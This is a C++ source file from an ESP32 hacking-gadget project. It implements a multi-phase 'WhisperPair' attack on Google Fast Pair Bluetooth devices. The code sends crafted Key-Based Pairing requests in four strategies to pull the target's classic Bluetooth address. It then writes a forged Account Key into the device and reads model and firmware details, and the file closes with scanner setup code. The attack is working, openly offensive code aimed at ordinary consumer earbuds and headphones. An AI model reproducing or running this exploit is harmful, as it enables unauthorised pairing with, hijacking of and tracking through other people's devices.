rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
    // Find FP service
    wpAtkAddLog("Finding FP service...", HALEHOUND_HOTPINK);
    wpDrawAtkLog();

    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
    if (!pSvc) pSvc = pWpClient->getService(wpFpUUID16);

    if (!pSvc) {
        wpAtkAddLog("FP service NOT FOUND", 0xF800);
        wpDrawAtkLog();
        pWpClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    wpAtkAddLog("FP service found!", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Find KBP characteristic
    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);
    if (!pKbp) {
        wpAtkAddLog("KBP char NOT FOUND", 0xF800);
        wpDrawAtkLog();
        pWpClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    if (pKbp->canNotify()) {
        pKbp->registerForNotify(wpNotifyCb);
        delay(100);
    }

    wpAtkAddLog("KBP char ready", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Attack-phase UUIDs (stack locals to save DRAM)
    BLEUUID uuidPasskey("fe2c1235-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidAcctKey("fe2c1236-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidAdditional("fe2c1237-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidModelId("fe2c1233-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidDevInfo((uint16_t)0x180A);
    BLEUUID uuidFwRev((uint16_t)0x2A26);

    // ─── Phase 1: Multi-Strategy KBP Exploit ─────────────────────
    wpAtkAddLog("--- PHASE 1: KBP EXPLOIT ---", 0xF800);
    wpDrawAtkLog();

    uint8_t addrBytes[6];
    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &addrBytes[0], &addrBytes[1], &addrBytes[2],
           &addrBytes[3], &addrBytes[4], &addrBytes[5]);

    for (int s = 0; s < 4; s++) {
        char logBuf[WP_ATK_LOG_WIDTH];
        snprintf(logBuf, sizeof(logBuf), "Strategy %d: %s", s + 1, wpStrategies[s].name);
        wpAtkAddLog(logBuf, HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        uint8_t kbpReq[16];
        memset(kbpReq, 0, 16);
        kbpReq[0] = 0x00;  // KBP Request message type
        kbpReq[1] = wpStrategies[s].flags;
        memcpy(&kbpReq[4], addrBytes, 6);
        for (int i = 10; i < 16; i++) kbpReq[i] = (uint8_t)random(256);

        wpNotifRx = false;
        wpNotifLen = 0;

        if (pKbp->canWrite()) {
            pKbp->writeValue(kbpReq, 16, true);
        } else {
            pKbp->writeValue(kbpReq, 16, false);
        }

        unsigned long t0 = millis();
        while (millis() - t0 < 2000 && !wpNotifRx) {
            delay(50);
        }

        if (wpNotifRx) {
            wpAtkResult.strategyResults[s] = 2;
            snprintf(logBuf, sizeof(logBuf), "  RESPONSE! %d bytes", (int)wpNotifLen);
            wpAtkAddLog(logBuf, 0x07E0);
            wpDrawAtkLog();

            if (wpAtkResult.strategyUsed < 0) {
                wpAtkResult.strategyUsed = s;
                memcpy(wpAtkResult.kbpResp, wpNotifData, wpNotifLen);
                wpAtkResult.kbpRespLen = wpNotifLen;

                if (wpNotifLen >= 7) {
                    memcpy(wpAtkResult.brEdrAddr, &wpNotifData[1], 6);
                    wpAtkResult.hasBrEdr = true;
                    char brStr[32];
                    snprintf(brStr, sizeof(brStr), "BR/EDR: %02X:%02X:%02X:%02X:%02X:%02X",
                             wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                             wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                             wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
                    wpAtkAddLog(brStr, 0xF800);
                    wpDrawAtkLog();
                }
            }
        } else {
            wpAtkResult.strategyResults[s] = 1;
            wpAtkAddLog("  No response", HALEHOUND_GUNMETAL);
            wpDrawAtkLog();
        }

        delay(300);
    }

    wpAtkResult.phase1Done = true;

    // ─── Phase 2: Account Key Injection ──────────────────────────
    wpAtkAddLog("--- PHASE 2: ACCT KEY ---", 0xF800);
    wpDrawAtkLog();

    BLERemoteCharacteristic* pAcctKey = pSvc->getCharacteristic(uuidAcctKey);
    if (pAcctKey) {
        for (int i = 0; i < 16; i++) {
            wpAtkResult.acctKey[i] = (uint8_t)random(256);
        }

        wpAtkAddLog("Writing Account Key...", HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        if (pAcctKey->canWrite()) {
            pAcctKey->writeValue(wpAtkResult.acctKey, 16, true);
        } else {
            pAcctKey->writeValue(wpAtkResult.acctKey, 16, false);
        }

        wpAtkResult.acctKeyWritten = true;
        wpAtkAddLog("Account Key INJECTED!", 0x07E0);
        wpDrawAtkLog();
    } else {
        wpAtkAddLog("AcctKey char not found", HALEHOUND_GUNMETAL);
        wpDrawAtkLog();
    }

    wpAtkResult.phase2Done = true;

    // ─── Phase 3: Characteristic Enumeration ─────────────────────
    wpAtkAddLog("--- PHASE 3: INTEL ---", 0xF800);
    wpDrawAtkLog();

    // Passkey char
    BLERemoteCharacteristic* pPk = pSvc->getCharacteristic(uuidPasskey);
    wpAtkResult.hasPasskey = (pPk != nullptr);
    wpAtkAddLog(pPk ? "Passkey char: FOUND" : "Passkey char: absent",
                pPk ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    wpDrawAtkLog();

    // Additional Data char
    BLERemoteCharacteristic* pAd = pSvc->getCharacteristic(uuidAdditional);
    wpAtkResult.hasAdditional = (pAd != nullptr);
    wpAtkAddLog(pAd ? "AdditionalData: FOUND" : "AdditionalData: absent",
                pAd ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    wpDrawAtkLog();

    // Model ID char
    BLERemoteCharacteristic* pMid = pSvc->getCharacteristic(uuidModelId);
    if (pMid && pMid->canRead()) {
        std::string mv = pMid->readValue();
        if (mv.length() >= 3) {
            memcpy(wpAtkResult.modelIdBytes, mv.data(), 3);
            wpAtkResult.hasModelId = true;
            char midStr[32];
            snprintf(midStr, sizeof(midStr), "Model ID: 0x%02X%02X%02X",
                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                     wpAtkResult.modelIdBytes[2]);
            wpAtkAddLog(midStr, HALEHOUND_MAGENTA);
        } else {
            wpAtkAddLog("Model ID: short read", HALEHOUND_GUNMETAL);
        }
    } else {
        wpAtkAddLog("Model ID: not readable", HALEHOUND_GUNMETAL);
    }
    wpDrawAtkLog();

    // Firmware Revision (Device Info Service 0x180A, char 0x2A26)
    BLERemoteService* pDis = pWpClient->getService(uuidDevInfo);
    if (pDis) {
        BLERemoteCharacteristic* pFw = pDis->getCharacteristic(uuidFwRev);
        if (pFw && pFw->canRead()) {
            std::string fv = pFw->readValue();
            if (fv.length() > 0) {
                size_t copyLen = fv.length();
                if (copyLen > 19) copyLen = 19;
                memcpy(wpAtkResult.firmware, fv.data(), copyLen);
                wpAtkResult.firmware[copyLen] = '\0';
                wpAtkResult.hasFirmware = true;
                char fwStr[42];
                snprintf(fwStr, sizeof(fwStr), "FW: %.19s", wpAtkResult.firmware);
                wpAtkAddLog(fwStr, HALEHOUND_MAGENTA);
            }
        } else {
            wpAtkAddLog("FW Rev: not readable", HALEHOUND_GUNMETAL);
        }
    } else {
        wpAtkAddLog("DevInfo svc: absent", HALEHOUND_GUNMETAL);
    }
    wpDrawAtkLog();

    wpAtkResult.phase3Done = true;

    // Disconnect
    pWpClient->disconnect();

    wpAtkAddLog("=== ATTACK COMPLETE ===", 0xF800);
    wpDrawAtkLog();
    delay(1500);

    inAttack = false;
    inAttackResult = true;
    atkResultPage = 0;
    wpDrawAttackReport();
}

// ─── Public Interface ────────────────────────────────────────────────────
void setup() {
    if (wpInit) return;

    #if CYD_DEBUG
    Serial.println("[WP] WhisperPair Scanner initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    wpDrawHeader();

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pWpScan = BLEDevice::getScan();
    if (!pWpScan) {
        Serial.println("[WP] getScan() returned NULL");
        wpExit = true;
        return;
    }

    pWpScan->setActiveScan(true);
    pWpScan->setInterval(100);
    pWpScan->setWindow(99);

    wpCount = 0;
    wpCurIdx = 0;
    wpListStart = 0;
    wpProbeIdx = -1;
    wpExit = false;
    inResult = false;
    pWpClient = nullptr;
    wpInit = true;

